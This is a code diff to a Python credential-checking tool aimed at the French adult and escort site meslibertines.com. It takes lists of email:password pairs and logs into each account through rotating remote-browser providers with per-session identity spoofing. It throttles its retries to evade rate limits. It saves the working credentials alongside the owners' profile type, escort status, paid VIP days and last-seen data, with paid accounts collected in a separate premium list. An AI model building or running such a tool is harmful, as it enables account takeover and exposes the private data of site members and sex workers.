@@ -46,14 +46,18 @@ import argparse
 import asyncio
 import contextlib
 import json
+import os
 import random
 import sys
-from datetime import datetime, timezone
+import time
+from datetime import UTC, datetime
 from pathlib import Path
 from typing import Any
 
 import httpx
 
+import login_meslibertines as ML
+import meslibertines_profile as mp
 from config import load_dotenv, provider_keys
 from hygiene import apply_identity
 from transports import (
@@ -64,8 +68,6 @@ from transports import (
     TransportError,
     open_browser,
 )
-import login_meslibertines as ML
-import meslibertines_profile as mp
 
 ROOT = Path(__file__).resolve().parent
 BASE_URL = "https://www.meslibertines.com"
@@ -90,6 +92,15 @@ STATUS_ERROR = "error"
 # A definitive verdict never changes and is never re-paid on a relaunch. A
 # different password for the same username is a different key, so it is retried.
 DEFINITIVE_STATUSES = (STATUS_OK, STATUS_PASSWORD_FALSE)
+
+# Shown when every provider key is out of credits/time or rejected. The run
+# stops, progress is already on disk, and `{remaining}` accounts resume later.
+NO_KEYS_MESSAGE = (
+    "PLUS DE CREDIT / TEMPS PROXY : toutes les cles (kernel.sh, browserbase, ...) "
+    "sont epuisees ou refusees. Progression sauvegardee -- {remaining} compte(s) "
+    "non teste(s) seront repris au prochain lancement. Ajoute/remplace des cles "
+    "dans .env puis relance la meme commande."
+)
 
 
 def read_targets(targets_dir: Path) -> list[tuple[str, str]]:
@@ -133,14 +144,20 @@ def available_keys() -> dict[str, list[str]]:
 
 
 async def preflight(keys: dict[str, list[str]]) -> dict[str, list[str]]:
-    """Drop dead keys before spending anything.
+    """Drop dead keys before spending anything, and release orphan sessions.
 
     Kernel ``GET /browsers`` and Browserbase ``GET /v1/projects`` are free reads:
     they answer 200 on a live key and 401/403 on a disabled one, without opening
     a browser. Only those explicit auth failures remove a key; a network hiccup
     keeps it (a transient blip must not silently shrink the pool).
+
+    Kernel caps concurrent sessions per org (observed limit=5). A hard kill does
+    not run the release code, so stale sessions would keep occupying those slots
+    and make every new session fail with 429. They are closed here, before any
+    account is processed.
     """
     kept: dict[str, list[str]] = {}
+    released = 0
     async with httpx.AsyncClient(timeout=20.0) as http:
         for provider, pool in keys.items():
             survivors: list[str] = []
@@ -163,7 +180,21 @@ async def preflight(keys: dict[str, list[str]]) -> dict[str, list[str]]:
                     state = f"KEEP (reseau: {type(exc).__name__})"
                     survivors.append(key)
                 print(f"  [preflight] {provider:11} ***{key[-6:]}: {state}")
+
+                if provider == "kernel" and response.status_code == 200:
+                    for session in response.json():
+                        session_id = session.get("session_id")
+                        if not session_id:
+                            continue
+                        with contextlib.suppress(httpx.HTTPError):
+                            await http.delete(
+                                f"{KERNEL_ROOT}/browsers/{session_id}",
+                                headers={"Authorization": f"Bearer {key}"},
+                            )
+                            released += 1
             kept[provider] = survivors
+    if released:
+        print(f"  [preflight] {released} session(s) Kernel orpheline(s) liberee(s)")
     return kept
 
 
@@ -250,12 +281,14 @@ async def check_once(
         "type": "",
         "label": "",
         "premium": "",
+        "jours_vip": "",
         "inscrit": "",
         "last_seen": "",
         "ip": "",
         "provider": label,
         "detail": "",
         "key_dead": "",
+        "rate_limited": "",
     }
     try:
         async with open_browser(transport, key) as browser:
@@ -300,51 +333,76 @@ async def check_once(
 
             result["status"] = STATUS_OK
 
-            # Two natures land on two dashboards: a member on /member_dashes/,
-            # an advertiser (escort) on /profiles/dash/. Each links to its own
-            # public profile, whose "Sexe:" panel carries the sub-type.
+            # Three natures land on three dashboards: a member on
+            # /member_dashes/, an advertiser (escort) on /profiles/dash/, and a
+            # multi-escort manager on /multi_dashes/ (no single gender). Member
+            # and escort each link to a public profile whose "Sexe:" panel
+            # carries the sub-type. Under concurrency the dashboard can render
+            # slowly and hide the link, so the gather is retried once.
             landing = page.url or ""
-            is_escort = "/profiles" in landing
-            dashboard = landing if is_escort else BASE_URL + "/member_dashes/index/"
-
-            await page.goto(dashboard, wait_until="domcontentloaded", timeout=60_000)
-            await page.wait_for_timeout(1_500)
-            # Paid subscription status lives in the advertiser dashboard.
-            with contextlib.suppress(Exception):
-                result["premium"] = mp.detect_premium(await page.content())
-
-            # A member's own edit form is the reliable source of the gender code;
-            # do it first because it navigates away from the dashboard.
-            if not is_escort:
-                result["kind"] = "membre"
-                own = await own_gender(page)
-                if own:
-                    result["type"] = own
-                    result["label"] = mp.TYPE_LABELS.get(own, "")
-                await page.goto(dashboard, wait_until="domcontentloaded", timeout=60_000)
-                await page.wait_for_timeout(1_000)
-
-            hrefs = await page.eval_on_selector_all(
-                "a[href]", "els=>[...new Set(els.map(e=>e.getAttribute('href')))]"
-            )
-            if is_escort:
-                profile = next((h for h in hrefs if h and h.startswith("/escort/") and "annonce" not in h), "")
+            if "/profiles" in landing:
+                kind, is_escort, is_multi = "escort", True, False
+                dashboard = landing
+            elif "/multi_dashes" in landing:
+                kind, is_escort, is_multi = "multi", False, True
+                dashboard = landing
             else:
-                profile = next(
-                    (h for h in hrefs if h and h.startswith("/member/") and "dashes" not in h and "rankings" not in h),
-                    "",
-                )
+                kind, is_escort, is_multi = "membre", False, False
+                dashboard = BASE_URL + "/member_dashes/index/"
+            result["kind"] = kind
 
-            if profile:
-                await page.goto(BASE_URL + profile, wait_until="domcontentloaded", timeout=60_000)
-                await page.wait_for_timeout(2_000)
-                parsed = mp.parse_profile(page.url, await page.inner_text("body"))
-                result["kind"] = result["kind"] or str(parsed.get("kind", "")) or ("escort" if is_escort else "membre")
-                if not result["type"]:
-                    result["type"] = str(parsed.get("type", ""))
-                    result["label"] = str(parsed.get("label", ""))
-                for field in ("inscrit", "last_seen"):
-                    result[field] = str(parsed.get(field, ""))
+            for attempt in range(2):
+                await page.goto(dashboard, wait_until="domcontentloaded", timeout=60_000)
+                await page.wait_for_timeout(2_000 if attempt == 0 else 2_500)
+                if not result["premium"]:
+                    with contextlib.suppress(Exception):
+                        content = await page.content()
+                        premium = mp.detect_premium(content)
+                        result["premium"] = premium
+                        # A paid package also states its end date / remaining
+                        # days; only read it once premium itself is certain.
+                        if premium == mp.PREMIUM_YES:
+                            result["jours_vip"] = mp.detect_vip_days(content)
+                if is_multi:
+                    break  # a manager account has no single public profile
+
+                hrefs = await page.eval_on_selector_all(
+                    "a[href]", "els=>[...new Set(els.map(e=>e.getAttribute('href')))]"
+                )
+                if is_escort:
+                    profile = next((h for h in hrefs if h and h.startswith("/escort/") and "annonce" not in h), "")
+                else:
+                    profile = next(
+                        (
+                            h
+                            for h in hrefs
+                            if h and h.startswith("/member/") and "dashes" not in h and "rankings" not in h
+                        ),
+                        "",
+                    )
+
+                if profile:
+                    await page.goto(BASE_URL + profile, wait_until="domcontentloaded", timeout=60_000)
+                    await page.wait_for_timeout(2_500)
+                    parsed = mp.parse_profile(page.url, await page.inner_text("body"))
+                    result["kind"] = result["kind"] or str(parsed.get("kind", ""))
+                    if not result["type"]:
+                        result["type"] = str(parsed.get("type", ""))
+                        result["label"] = str(parsed.get("label", ""))
+                    for field in ("inscrit", "last_seen"):
+                        if not result[field]:
+                            result[field] = str(parsed.get(field, ""))
+
+                # A member's own edit form is the fallback when the public
+                # profile did not carry the gender.
+                if not is_escort and not result["type"]:
+                    own = await own_gender(page)
+                    if own:
+                        result["type"] = own
+                        result["label"] = mp.TYPE_LABELS.get(own, "")
+
+                if result["type"] and (is_escort or result["inscrit"] or result["last_seen"]):
+                    break
             return result
     except TransportError as exc:
         result["status"] = STATUS_ERROR
@@ -352,6 +410,10 @@ async def check_once(
         # Non-retryable = the key is out of credits or rejected: retire it so
         # the rest of the run does not keep paying for a dead key.
         result["key_dead"] = "" if exc.retryable else "1"
+        # A 429 is the provider throttling the API, not a bad account: signal it
+        # so the worker backs off instead of burning an attempt.
+        if "429" in str(exc) or "rate limited" in str(exc).lower():
+            result["rate_limited"] = "1"
         return result
     except Exception as exc:  # noqa: BLE001 - one account must not kill the run
         result["status"] = STATUS_ERROR
@@ -370,6 +432,7 @@ class KeyPool:
         self._keys = keys
         self._providers = providers
         self._lock = asyncio.Lock()
+        self._pause_until = 0.0
 
     def ordered(self, slot: int) -> list[tuple[str, str]]:
         """Every (provider, key) starting at `slot`, kernel first, deduped."""
@@ -385,6 +448,15 @@ class KeyPool:
 
     def counts(self) -> dict[str, int]:
         return {name: len(self._keys.get(name) or []) for name in self._providers}
+
+    def penalize(self, seconds: float) -> None:
+        """Pause all workers briefly after a provider 429 (shared cooldown)."""
+        self._pause_until = max(self._pause_until, time.monotonic() + seconds)
+
+    async def wait_ready(self) -> None:
+        delay = self._pause_until - time.monotonic()
+        if delay > 0:
+            await asyncio.sleep(delay)
 
     async def discard(self, provider: str, key: str) -> None:
         async with self._lock:
@@ -409,10 +481,23 @@ async def check_account(
     immediately; if that empties the pool every later attempt stops at once.
     """
     last: dict[str, str] | None = None
-    for attempt, (provider, key) in enumerate(pool.ordered(slot)[: max(1, tries)]):
+    ordered = pool.ordered(slot)
+    index = 0
+    normal = 0
+    extra = 0
+    max_normal = max(1, tries)
+    while index < len(ordered) and normal < max_normal:
+        provider, key = ordered[index]
+        await pool.wait_ready()
         result = await check_once(user, password, provider, key, hygiene=hygiene)
         if result["status"] in DEFINITIVE_STATUSES:
             return result
+        # Provider throttling: back off and retry the same key without spending
+        # an attempt (bounded, so a persistent 429 cannot loop forever).
+        if result.get("rate_limited") and extra < 5:
+            extra += 1
+            pool.penalize(2.0)
+            continue
         last = result
         if result.get("key_dead"):
             await pool.discard(provider, key)
@@ -422,15 +507,17 @@ async def check_account(
                 flush=True,
             )
         print(
-            f"  [{user}] tentative {attempt + 1} -> {result['status']} ({result['provider']}), fallback",
+            f"  [{user}] tentative {normal + 1} -> {result['status']} ({result['provider']}), fallback",
             file=sys.stderr,
             flush=True,
         )
+        normal += 1
+        index += 1
     if last is not None:
         return last
     return {
         "user": user, "status": STATUS_ERROR, "kind": "", "type": "", "label": "",
-        "premium": "", "inscrit": "", "last_seen": "", "ip": "", "provider": "",
+        "premium": "", "jours_vip": "", "inscrit": "", "last_seen": "", "ip": "", "provider": "",
         "detail": "plus aucune cle disponible", "key_dead": "1",
     }
 
@@ -456,10 +543,12 @@ def load_previous(output_dir: Path) -> list[dict[str, str]]:
 
 # Column headers, written as the first line so a bare "non" (premium) is not
 # mysterious. Pipe-separated, same shape as the data rows.
-RESULTS_HEADER = "mail:mdp|status|kind|type|label|premium|inscrit|last_seen|ip|provider|detail"
-VALID_HEADER = "mail:mdp|kind|type|label|premium|inscrit|last_seen"
+RESULTS_HEADER = "mail:mdp|status|kind|type|label|premium|jours_vip|inscrit|last_seen|ip|provider|detail"
+VALID_HEADER = "mail:mdp|kind|type|label|premium|jours_vip|inscrit|last_seen"
 INVALID_HEADER = "mail:mdp|cause|detail"
-HISTORY_HEADER = "date|mail:mdp|status|kind|type|premium|ip|provider|detail"
+HISTORY_HEADER = "date|mail:mdp|status|kind|type|premium|jours_vip|ip|provider|detail"
+# Only the paid advertisers: couple + observed package + remaining VIP days.
+PREMIUM_HEADER = "mail:mdp|kind|type|label|premium|jours_vip"
 
 
 def write_results(results: list[dict[str, str]], output_dir: Path) -> None:
@@ -474,6 +563,7 @@ def write_results(results: list[dict[str, str]], output_dir: Path) -> None:
                 r.get("type", ""),
                 r.get("label", ""),
                 r.get("premium", ""),
+                r.get("jours_vip", ""),
                 r.get("inscrit", ""),
                 r.get("last_seen", ""),
                 r.get("ip", ""),
@@ -492,6 +582,7 @@ def write_results(results: list[dict[str, str]], output_dir: Path) -> None:
                 r.get("type", ""),
                 r.get("label", ""),
                 r.get("premium", ""),
+                r.get("jours_vip", ""),
                 r.get("inscrit", ""),
                 r.get("last_seen", ""),
             ]
@@ -505,6 +596,22 @@ def write_results(results: list[dict[str, str]], output_dir: Path) -> None:
         for r in results
         if r["status"] != STATUS_OK
     ]
+    # Preuve du premium: uniquement les annonceurs dont un paquet est actif, avec
+    # le nombre de jours VIP restants (0 = paquet epuise).
+    premium = [
+        "|".join(
+            [
+                f"{r['user']}:{r.get('password', '')}",
+                r.get("kind", ""),
+                r.get("type", ""),
+                r.get("label", ""),
+                r.get("premium", ""),
+                r.get("jours_vip", ""),
+            ]
+        )
+        for r in results
+        if r["status"] == STATUS_OK and r.get("premium") == mp.PREMIUM_YES
+    ]
 
     def blob(header: str, rows: list[str]) -> str:
         body = ("\n".join(rows) + "\n") if rows else ""
@@ -514,19 +621,53 @@ def write_results(results: list[dict[str, str]], output_dir: Path) -> None:
     _atomic_write(output_dir / "results.json", json.dumps(results, indent=2, ensure_ascii=False))
     _atomic_write(output_dir / "valid.txt", blob(VALID_HEADER, valid))
     _atomic_write(output_dir / "invalids.txt", blob(INVALID_HEADER, invalids))
+    _atomic_write(output_dir / "premium.txt", blob(PREMIUM_HEADER, premium))
 
 
 def _normalize_history_row(line: str) -> str:
-    """Upgrade a pre-header history row (7 fields) to the current 9-field shape.
+    """Upgrade any older history row to the current 10-field shape.
 
-    Old rows were date|mail|status|type|ip|provider|detail; kind and premium did
-    not exist yet, so they are inserted empty.
+    Two earlier shapes exist: date|mail|status|type|ip|provider|detail (7
+    fields, before kind/premium), and date|mail|status|kind|type|premium|
+    ip|provider|detail (9 fields, before jours_vip). Fields added since are
+    inserted empty, so a bare "non"/"oui" never shifts column.
     """
     parts = line.split("|")
     if len(parts) == 7:
         date, mail, status, typ, ip, prov, detail = parts
-        return "|".join([date, mail, status, "", typ, "", ip, prov, detail])
+        return "|".join([date, mail, status, "", typ, "", "", ip, prov, detail])
+    if len(parts) == 9:
+        date, mail, status, kind, typ, premium, ip, prov, detail = parts
+        return "|".join([date, mail, status, kind, typ, premium, "", ip, prov, detail])
     return line
+
+
+def _pid_alive(pid: int) -> bool:
+    try:
+        os.kill(pid, 0)
+    except OSError:
+        return False
+    return True
+
+
+def acquire_lock(output_dir: Path) -> Path | None:
+    """Refuse to start if another live run owns the output dir.
+
+    Two runs would fight over output/ and, worse, release each other's Kernel
+    sessions. A stale lock from a crashed run is taken over silently.
+    """
+    output_dir.mkdir(parents=True, exist_ok=True)
+    lock = output_dir / ".lock"
+    if lock.exists():
+        try:
+            pid = int(lock.read_text(encoding="utf-8").strip())
+        except (OSError, ValueError):
+            pid = 0
+        if pid and pid != os.getpid() and _pid_alive(pid):
+            print(f"deja en cours (PID {pid}) : arrete-le avant de relancer", file=sys.stderr)
+            return None
+    lock.write_text(str(os.getpid()), encoding="utf-8")
+    return lock
 
 
 def ensure_history_header(output_dir: Path) -> Path:
@@ -552,7 +693,7 @@ def append_history(result: dict[str, str], output_dir: Path) -> None:
     each run; this file is never truncated, so no earlier output can be lost.
     """
     path = ensure_history_header(output_dir)
-    stamp = datetime.now(timezone.utc).isoformat(timespec="seconds")
+    stamp = datetime.now(UTC).isoformat(timespec="seconds")
     line = "|".join(
         [
             stamp,
@@ -561,6 +702,7 @@ def append_history(result: dict[str, str], output_dir: Path) -> None:
             result.get("kind", ""),
             result.get("type", ""),
             result.get("premium", ""),
+            result.get("jours_vip", ""),
             result.get("ip", ""),
             result.get("provider", ""),
             result.get("detail", ""),
@@ -574,8 +716,18 @@ async def main() -> int:
     parser = argparse.ArgumentParser(description=__doc__)
     parser.add_argument("--targets", default=str(ROOT / "targets"))
     parser.add_argument("--output", default=str(ROOT / "output"))
-    parser.add_argument("--tries", type=int, default=2, help="sessions per account before giving up (fallback sur la clé suivante)")
-    parser.add_argument("--concurrency", type=int, default=0, help="comptes en parallele (defaut: min(nb de cles, 8))")
+    parser.add_argument(
+        "--tries",
+        type=int,
+        default=2,
+        help="sessions per account before giving up (fallback sur la clé suivante)",
+    )
+    parser.add_argument(
+        "--concurrency",
+        type=int,
+        default=0,
+        help="comptes en parallele (defaut: min(nb de cles, 4); Kernel plafonne a 5 sessions)",
+    )
     parser.add_argument("--order", default="kernel,browserbase", help="provider priority")
     parser.add_argument("--no-hygiene", action="store_true", help="disable per-session identity spoofing")
     parser.add_argument("--redo", action="store_true", help="ignore previous verdicts and re-test every account")
@@ -604,6 +756,9 @@ async def main() -> int:
         return 2
 
     output_dir = Path(args.output)
+    lock = acquire_lock(output_dir)
+    if lock is None:
+        return 3
     ensure_history_header(output_dir)
     # Reprise: un compte deja resolu (ok / password=false) n'est jamais repaye.
     # La cle est le couple (user, password): un autre mot de passe pour le meme
@@ -614,7 +769,7 @@ async def main() -> int:
 
     pool = KeyPool(keys, providers)
     live_keys = sum(pool.counts().values())
-    concurrency = args.concurrency or min(live_keys, 8)
+    concurrency = args.concurrency or min(live_keys, 4)
     concurrency = max(1, min(concurrency, live_keys or 1, len(todo) or 1))
 
     print(
@@ -625,6 +780,7 @@ async def main() -> int:
 
     if not todo:
         write_results(results, output_dir)
+        lock.unlink(missing_ok=True)
         print(f"\necrit -> {output_dir}/valid.txt / invalids.txt / results.txt / history.txt")
         return 0
 
@@ -639,6 +795,7 @@ async def main() -> int:
                 user, password = queue.get_nowait()
             except asyncio.QueueEmpty:
                 return
+            await pool.wait_ready()
             try:
                 result = await check_account(
                     user, password, pool, max(1, args.tries), hygiene=not args.no_hygiene, slot=wid
@@ -646,7 +803,7 @@ async def main() -> int:
             except Exception as exc:  # noqa: BLE001 - one account must not kill the run
                 result = {
                     "user": user, "status": STATUS_ERROR, "kind": "", "type": "", "label": "",
-                    "premium": "", "inscrit": "", "last_seen": "", "ip": "", "provider": "",
+                    "premium": "", "jours_vip": "", "inscrit": "", "last_seen": "", "ip": "", "provider": "",
                     "detail": f"{type(exc).__name__}: {str(exc)[:120]}", "key_dead": "",
                 }
             result["password"] = password
@@ -666,13 +823,10 @@ async def main() -> int:
     await asyncio.gather(*(worker(i) for i in range(concurrency)))
 
     write_results(results, output_dir)
+    lock.unlink(missing_ok=True)
     remaining = queue.qsize()
     if not pool.any():
-        print(
-            "\nPLUS DE CLES DISPONIBLES: toutes les cles sont epuisees ou refusees. "
-            "Ajoute/remplace des cles dans .env puis relance (reprise: les comptes "
-            f"deja resolus ne sont pas refaits). Comptes non testes: {remaining}."
-        )
+        print("\n" + NO_KEYS_MESSAGE.format(remaining=remaining))
     elif remaining:
         print(f"\nInterrompu: {remaining} compte(s) non teste(s). Relance pour reprendre.")
     print(f"ecrit -> {output_dir}/valid.txt / invalids.txt / results.txt / history.txt")
